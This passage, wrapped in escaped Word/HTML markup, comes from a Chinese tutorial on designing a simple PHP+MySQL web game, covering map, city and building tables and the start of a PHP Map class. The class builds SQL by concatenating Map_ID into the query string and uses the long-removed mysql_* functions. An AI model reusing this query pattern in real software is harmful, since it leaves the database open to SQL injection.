style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;数据库上，尽量优化。结构上能用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;字节的就别用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;2&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;字节。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;二、一个详细的例子。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;单纯的讨论数据流程是件痛苦的事情。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;讨论程序而不给代码也是比较痛苦。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;这里用的是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;php+mysql&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的。&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;同时，这个例子没有用到类。如果时间充足的话，今年年底，我会提供一个带即时交互的简单&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;代码和核心类来说明使用了设计模式的好处。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:blue;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;那就按一个超简单的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的方式来讨论。配上适当的代码。应该有所帮助。不足的地方也请大家指出，对我个人也是帮助。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;我们不去考虑游戏的可玩性，数值平衡等等问题。我们先只考虑一个简单例子的实现。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;那么一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;webgame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;的基本内容需要些什么呢？&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;数据库：玩家、地图、城市、建筑、武器、士兵。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;功能：登陆、升级、个人战斗、士兵之间的战斗、与城市的战斗、修建建筑、打造武器、买卖道具。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;（注意：每一个功能，必然对应&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;个或多个数据表。上面数据库中所列的只是基础中的基础。）&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;首先是地图、城市、建筑。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;这里认为，地图可以有多张，城市在地图上，建筑在城市内。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;地图表&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nMap&amp;nbsp;&amp;nbsp;:Map_ID ,X&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;, Y&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;,City_ID(&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;城市&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;ID),&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;描述。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;其中&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Map_ID&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;是指地图的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;id&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。不是自动编号。一张地图就是一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Map_ID&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，可以重复。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;城市表&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nCity:City_ID,&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;城市名字，城市所有人，城市等级，城市资源，描述。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;建筑表&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nBuild:ID&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;City_ID&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;，建筑名称，建筑等级，建筑功能。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;其中，地图表确定城市的位置，城市表确定城市的相关数据以及所有人，建筑表内的多条信息属于某一个城市。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;建表后，显示出来。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;循环。把地图表整个取出来就&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;ok&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;跟普通网站的新闻列表没太大区别。不同的是，你需要取得&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;X&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;坐标和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Y&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;坐标定位。可以用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;tabel&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;也可以用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;span lang=&quot;EN-US&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&amp;nbsp;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;1&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;class&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;Map&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;地图类&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;2&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;{&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;3&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$Map_ID&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;4&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;function&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;Map_bg_css(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$Map_ID&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;)&amp;nbsp;{&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;5&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;6&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$this&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;-&amp;gt;Map_ID&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$Map_ID&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;7&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;8&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$db_name&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;,&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$link&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;9&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$sql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&quot;select&amp;nbsp;*&amp;nbsp;from&amp;nbsp;map&amp;nbsp;where&amp;nbsp;Map_ID=''&quot;.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$this&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;-&amp;gt;Map_ID.&quot;''&amp;nbsp;limit&amp;nbsp;1&quot;;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;10&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$result&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;mysql_query&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$sql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;,&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$link&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;11&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;&amp;lt;style&amp;nbsp;type=&quot;.&quot;text&quot;.&quot;/&quot;.&quot;css&amp;gt;&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;12&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$rs&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;=&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;mysql_fetch_array&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:purple;&quot;&gt;$result&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;13&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;14&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;echo&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&quot;#map{&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span 